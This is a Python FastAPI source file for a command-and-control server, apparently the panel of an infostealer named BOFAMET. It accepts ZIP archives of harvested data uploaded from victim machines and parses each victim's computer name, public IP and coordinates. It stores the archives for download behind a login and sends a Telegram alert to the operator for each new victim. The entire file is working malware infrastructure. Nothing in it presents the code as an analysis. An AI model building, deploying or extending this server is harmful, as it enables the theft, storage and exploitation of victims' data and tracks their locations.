from fastapi import FastAPI, UploadFile, File, Form, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, FileResponse, RedirectResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware
from starlette import status
import uvicorn
import sqlite3
import os
import datetime
import zipfile
import shutil
import re 
import json
from typing import List, Dict
from starlette.background import BackgroundTasks
import sys
import subprocess
from fastapi.staticfiles import StaticFiles
import httpx

NOHUP_LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'nohup.out')

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')

VALID_USERNAME = None
VALID_PASSWORD = None
LISTEN_PORT = None
GLOBAL_SECRET_KEY = None
TELEGRAM_BOT_TOKEN = None
TELEGRAM_CHAT_ID = None
TELEGRAM_NOTIFICATIONS_ENABLED = False
SERVER_PUBLIC_IP = "Unknown"

app_config = {
    'UPLOAD_FOLDER': 'uploads', 
    'DATABASE': 'c2_logs.db',
    'PORT': 8000 
}


if not os.path.exists(app_config['UPLOAD_FOLDER']):
    os.makedirs(app_config['UPLOAD_FOLDER'])

templates = Jinja2Templates(directory="templates")

failed_login_attempts = {}
blocked_ips = {}
MAX_LOGIN_ATTEMPTS = 5
MAX_GLOBAL_ATTEMPTS = 100 

failed_login_attempts_global = 0
panel_permanently_blocked = False

BLOCK_DURATION_MINUTES = 5 
BLOCK_DURATION = datetime.timedelta(minutes=BLOCK_DURATION_MINUTES)

def init_db():
    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            ip_address TEXT,
            computer_name TEXT,
            system_info_text TEXT,
            file_path TEXT NOT NULL,
            public_ip TEXT, 
            latitude REAL, 
            longitude REAL  
        )
    ''')
    conn.commit()
    conn.close()

def load_server_config():
    global VALID_USERNAME, VALID_PASSWORD, LISTEN_PORT, GLOBAL_SECRET_KEY, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_NOTIFICATIONS_ENABLED, SERVER_PUBLIC_IP

    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config_data = json.load(f)
                VALID_USERNAME = config_data.get('username')
                VALID_PASSWORD = config_data.get('password')
                LISTEN_PORT = config_data.get('port')
                GLOBAL_SECRET_KEY = bytes.fromhex(config_data.get('secret_key'))
                TELEGRAM_BOT_TOKEN = config_data.get('telegram_bot_token')
                TELEGRAM_CHAT_ID = config_data.get('telegram_chat_id')
                TELEGRAM_NOTIFICATIONS_ENABLED = config_data.get('telegram_notifications_enabled', False)
                SERVER_PUBLIC_IP = config_data.get('server_public_ip', "Unknown")
                print("Server config loaded by server.py.")
                return True
        except (json.JSONDecodeError, KeyError, ValueError) as e:
            print(f"CRITICAL ERROR: Failed to load server configuration from {CONFIG_FILE}: {e}")
            print("Please run 'python Config_C2.py' to configure the server first!")
            sys.exit(1)
    else:
        print(f"CRITICAL ERROR: Configuration file '{CONFIG_FILE}' not found.")
        print("Please run 'python Config_C2.py' to configure the server first!")
        sys.exit(1)

def save_server_config():
    config_data = {
        'username': VALID_USERNAME,
        'password': VALID_PASSWORD,
        'port': LISTEN_PORT,
        'secret_key': GLOBAL_SECRET_KEY.hex() if GLOBAL_SECRET_KEY else None,
        'telegram_bot_token': TELEGRAM_BOT_TOKEN,
        'telegram_chat_id': TELEGRAM_CHAT_ID,     
        'telegram_notifications_enabled': TELEGRAM_NOTIFICATIONS_ENABLED,
        'server_public_ip': SERVER_PUBLIC_IP
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config_data, f, indent=4)
    print(f"Server configuration saved to {CONFIG_FILE}.")

async def get_external_ip_address():
    global SERVER_PUBLIC_IP
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get("https://api.ipify.org?format=json", timeout=5)
            response.raise_for_status()
            ip_data = response.json()
            SERVER_PUBLIC_IP = ip_data.get("ip", "IP_Not_Found")
            save_server_config()
            print(f"Server public IP fetched: {SERVER_PUBLIC_IP}")
    except httpx.RequestError as e:
        print(f"Error fetching public IP: {e}")
        SERVER_PUBLIC_IP = "IP_Fetch_Error"
    except Exception as e:
        print(f"An unexpected error occurred while fetching public IP: {e}")
        SERVER_PUBLIC_IP = "IP_Unknown_Error"

load_server_config() 

app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)

app.mount("/static", StaticFiles(directory="static"), name="static")

if GLOBAL_SECRET_KEY:
    app.add_middleware(SessionMiddleware, secret_key=GLOBAL_SECRET_KEY)
else:
    print("CRITICAL ERROR: GLOBAL_SECRET_KEY not loaded. This should have been caught earlier.")
    sys.exit(1) 

app_config['PORT'] = LISTEN_PORT

init_db()

async def authenticate_user(request: Request):
    if panel_permanently_blocked:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Panel permanently blocked due to suspicious activity.",
        )

    if "authenticated" not in request.session or not request.session["authenticated"]:
        raise HTTPException(
            status_code=status.HTTP_303_SEE_OTHER,
            detail="Not authenticated",
            headers={"Location": "/login"}
        )
    
    current_ip = request.client.host
    session_ip = request.session.get('client_ip')

    if session_ip and session_ip != current_ip:
        request.session.clear()
        raise HTTPException(
            status_code=status.HTTP_303_SEE_OTHER,
            detail="IP address change detected, re-authentication required.",
            headers={"Location": "/login"}
        )

@app.get("/api/server_info", dependencies=[Depends(authenticate_user)])
async def get_server_info():
    return JSONResponse(content={
        "ip": SERVER_PUBLIC_IP,
        "port": LISTEN_PORT
    })

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def process_login(request: Request, username: str = Form(...), password: str = Form(...)):
    global failed_login_attempts_global, panel_permanently_blocked

    if panel_permanently_blocked:
        error_message = "Admin panel permanently blocked due to multiple suspicious login attempts. Server restart required."
        return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)

    client_ip = request.client.host

    if client_ip in blocked_ips and datetime.datetime.now() < blocked_ips[client_ip]:
        remaining_time = blocked_ips[client_ip] - datetime.datetime.now()
        total_seconds = int(remaining_time.total_seconds())
        minutes = total_seconds // 60
        seconds = total_seconds % 60
        error_message = f"Your IP address is blocked. Remaining {minutes} minutes and {seconds} seconds."
        return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)

    if username == VALID_USERNAME and password == VALID_PASSWORD:
        request.session['authenticated'] = True
        request.session['client_ip'] = client_ip
        if client_ip in failed_login_attempts:
            del failed_login_attempts[client_ip]
        failed_login_attempts_global = 0
        return RedirectResponse(url="/", status_code=status.HTTP_302_FOUND)
    else:
        failed_login_attempts_global += 1
        if failed_login_attempts_global >= MAX_GLOBAL_ATTEMPTS:
            panel_permanently_blocked = True
            error_message = "Admin panel permanently blocked due to excessive number of failed login attempts from different IP addresses."
            return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)

        failed_login_attempts[client_ip] = failed_login_attempts.get(client_ip, 0) + 1

        if failed_login_attempts[client_ip] >= MAX_LOGIN_ATTEMPTS:
            blocked_until = datetime.datetime.now() + datetime.timedelta(minutes=BLOCK_DURATION_MINUTES)
            blocked_ips[client_ip] = blocked_until
            del failed_login_attempts[client_ip]
            error_message = f"Too many incorrect attempts. Your IP address is blocked for {BLOCK_DURATION_MINUTES} minutes."
            return templates.TemplateResponse("login.html", {"request": request, "error_message": error_message}, status_code=status.HTTP_403_FORBIDDEN)
        else:
            return templates.TemplateResponse("login.html", {"request": request, "error_message": "Invalid username or password."})

@app.get("/logout")
async def logout(request: Request):
    request.session.clear()
    return RedirectResponse(url="/login", status_code=status.HTTP_302_FOUND)

@app.get("/", response_class=HTMLResponse, dependencies=[Depends(authenticate_user)])
async def index(request: Request):
    conn = sqlite3.connect(app_config['DATABASE'])
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC")
    logs_raw = cursor.fetchall()
    conn.close()

    logs_for_template = []
    for log_entry in logs_raw:
        log_dict = dict(log_entry)
        
        full_path_on_server = log_dict['file_path'] 
        
        file_name = os.path.basename(full_path_on_server)
        log_folder_name = os.path.basename(os.path.dirname(full_path_on_server))

        log_dict['download_url'] = request.url_for('download_file', folder_name=log_folder_name, file_name=file_name)
        log_dict['file_name_display'] = file_name
        log_dict['log_folder_name'] = log_folder_name

        logs_for_template.append(log_dict)

    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM logs")
    log_count = cursor.fetchone()[0]
    conn.close()


    return templates.TemplateResponse("index.html", {"request": request, "logs": logs_for_template, "log_count": log_count})

@app.get("/api/telegram_settings", dependencies=[Depends(authenticate_user)])
async def get_telegram_settings():
    print("BOFAMET: GET request received for /api/telegram_settings!")
    return JSONResponse(content={
        "bot_token": TELEGRAM_BOT_TOKEN,
        "chat_id": TELEGRAM_CHAT_ID,
        "enabled": TELEGRAM_NOTIFICATIONS_ENABLED
    })

@app.post("/api/telegram_settings", dependencies=[Depends(authenticate_user)])
async def update_telegram_settings(
    bot_token: str = Form(""),
    chat_id: str = Form(""),
    enabled: bool = Form(False)
):
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_NOTIFICATIONS_ENABLED
    TELEGRAM_BOT_TOKEN = bot_token
    TELEGRAM_CHAT_ID = chat_id
    TELEGRAM_NOTIFICATIONS_ENABLED = enabled
    save_server_config()
    print(f"Telegram settings updated: Token={TELEGRAM_BOT_TOKEN}, ChatID={TELEGRAM_CHAT_ID}, Enabled={TELEGRAM_NOTIFICATIONS_ENABLED}")
    return {"message": "Telegram settings updated successfully!"}

async def send_telegram_message(message: str):
    if not TELEGRAM_NOTIFICATIONS_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram notifications disabled or not fully configured.")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(url, json=payload, timeout=10)
            response.raise_for_status()
            print(f"Telegram message sent: {response.json()}")
    except httpx.RequestError as e:
        print(f"Error sending Telegram message (request error): {e}")
    except httpx.HTTPStatusError as e:
        print(f"Error sending Telegram message (HTTP error): {e.response.status_code} - {e.response.text}")
    except Exception as e:
        print(f"An unexpected error occurred while sending Telegram message: {e}")


@app.post("/upload")
async def upload_log(request: Request, background_tasks: BackgroundTasks, file: UploadFile = File(...), system_info: str = Form(...), latitude: float = Form(0.0), longitude: float = Form(0.0)):
    print(f"BOFAMET: Received raw system_info: \n{system_info[:min(len(system_info), 500)]}...")

    if not file:
        print("BOFAMET: No file provided in upload.")
        return {"message": "No file provided"}, 400

    if file.filename == '':
        print("BOFAMET: Empty file name in upload.")
        return {"message": "Empty file name"}, 400

    if not file.filename.lower().endswith('.zip'):
        print(f"BOFAMET: Invalid file type uploaded: {file.filename}")
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Only ZIP archives are allowed!"
        )
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.client.host

    # ОБНОВЛЕННЫЕ РЕГУЛЯРНЫЕ ВЫРАЖЕНИЯ ДЛЯ СООТВЕТСТВИЯ ФОРМАТУ main.go
    computer_name_match = re.search(r"▪ Computer Name: (.*?)\n", system_info)
    public_ip_match = re.search(r"▪ Public IP: (.*?)\n", system_info)
    
    computer_name = computer_name_match.group(1).strip() if computer_name_match else "Unknown computer"
    public_ip = public_ip_match.group(1).strip() if public_ip_match else "Unknown IP"

    print(f"BOFAMET: Parsed Computer Name: '{computer_name}'")
    print(f"BOFAMET: Parsed Public IP: '{public_ip}'")

    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()

    cursor.execute(
        "SELECT id, file_path FROM logs WHERE computer_name = ? AND public_ip = ?",
        (computer_name, public_ip)
    )
    existing_log = cursor.fetchone()

    if existing_log:
        old_log_id, old_file_path = existing_log
        old_log_folder = os.path.dirname(old_file_path)

        cursor.execute("DELETE FROM logs WHERE id = ?", (old_log_id,))
        conn.commit()

        if os.path.exists(old_log_folder) and os.path.isdir(old_log_folder):
            try:
                shutil.rmtree(old_log_folder)
                print(f"BOFAMET: Old log folder deleted: {old_log_folder}")
            except Exception as e:
                print(f"BOFAMET: Error deleting old log folder {old_log_folder}: {e}")
        else:
            print(f"BOFAMET: Old log folder not found or is not a directory: {old_log_folder}")


    log_folder_name = f"{public_ip}_{computer_name}_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"
    log_folder_path = os.path.join(app_config['UPLOAD_FOLDER'], log_folder_name)
    os.makedirs(log_folder_path, exist_ok=True)

    file_save_path = os.path.join(log_folder_path, file.filename)
    with open(file_save_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    info_file_path = os.path.join(log_folder_path, "system_info.txt")
    with open(info_file_path, 'w', encoding='utf-8') as f:
        f.write(system_info)

    cursor.execute(
        "INSERT INTO logs (timestamp, ip_address, computer_name, system_info_text, file_path, public_ip, latitude, longitude) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (timestamp, client_ip, computer_name, system_info, file_save_path, public_ip, latitude, longitude)
    )
    conn.commit()
    inserted_log_id = cursor.lastrowid
    conn.close()

    telegram_message = (
        f"🚨 New BOFAMET Log!\n\n"
        f"<b>ID:</b> {inserted_log_id}\n"
        f"<b>Timestamp:</b> {timestamp}\n"
        f"<b>Client IP:</b> <code>{client_ip}</code>\n"
        f"<b>Computer Name:</b> <code>{computer_name}</code>\n"
        f"<b>Public IP:</b> <code>{public_ip}</code>\n"
        f"<b>Coordinates:</b> {latitude:.4f}, {longitude:.4f}\n"
        f"<b>File:</b> <code>{file.filename}</code>\n"
    )
    background_tasks.add_task(send_telegram_message, telegram_message)


    return {"message": "Log uploaded successfully!"}

@app.get("/download/{folder_name}/{file_name}", dependencies=[Depends(authenticate_user)])
async def download_file(folder_name: str, file_name: str):
    full_file_path = os.path.join(app_config['UPLOAD_FOLDER'], folder_name, file_name)
    if not os.path.exists(full_file_path):
        return {"message": "File not found!"}, 404
    
    return FileResponse(full_file_path, media_type="application/zip", filename=file_name)

@app.delete("/api/logs/delete/{log_id}/{log_folder_name}", dependencies=[Depends(authenticate_user)])
async def delete_log_entry(log_id: int, log_folder_name: str):
    print(f"BOFAMET: DELETE request for log_id: {log_id}, folder_name: {log_folder_name}")
    conn = sqlite3.connect(app_config['DATABASE'])
    cursor = conn.cursor()
    
    cursor.execute("SELECT file_path FROM logs WHERE id = ?", (log_id,))
    result = cursor.fetchone()
    
    if not result:
        conn.close()
        print(f"BOFAMET: Log entry with ID {log_id} not found in database.")
        raise HTTPException(status_code=404, detail="Log entry not found.")
    
    db_file_path = result[0]
    print(f"BOFAMET: Found db_file_path: {db_file_path} for ID {log_id}")
    expected_log_folder = os.path.basename(os.path.dirname(db_file_path))
    
    print(f"BOFAMET: Mismatched folder names: Expected '{expected_log_folder}', received '{log_folder_name}'")
    if expected_log_folder != log_folder_name:
        conn.close()
        print(f"BOFAMET: Mismatched folder names: Expected '{expected_log_folder}', received '{log_folder_name}'")
        raise HTTPException(status_code=400, detail="Mismatched folder name for log ID.")
    
    cursor.execute("DELETE FROM logs WHERE id = ?", (log_id,))
    conn.commit()
    conn.close()
    
    folder_to_delete = os.path.join(app_config['UPLOAD_FOLDER'], log_folder_name)
    if os.path.exists(folder_to_delete) and os.path.isdir(folder_to_delete):
        try:
            shutil.rmtree(folder_to_delete)
            print(f"Log folder deleted: {folder_to_delete}")
        except Exception as e:
            print(f"Error deleting log folder {folder_to_delete}: {e}")
            raise HTTPException(status_code=500, detail=f"Failed to delete log folder: {e}")
    else:
        print(f"Log folder not found or is not a directory during deletion attempt: {folder_to_delete}")

    return {"message": "Log entry and associated folder deleted successfully!"}

if __name__ == '__main__':
    load_server_config() 
    
    app.SECRET_KEY = GLOBAL_SECRET_KEY
    app.add_middleware(SessionMiddleware, secret_key=app.SECRET_KEY)
    
    app_config['PORT'] = LISTEN_PORT 

    init_db() 
    
    import asyncio
    asyncio.run(get_external_ip_address())

    print(f"Starting server on http://0.0.0.0:{app_config['PORT']}")
    uvicorn.run(app, host='0.0.0.0', port=app_config['PORT']) 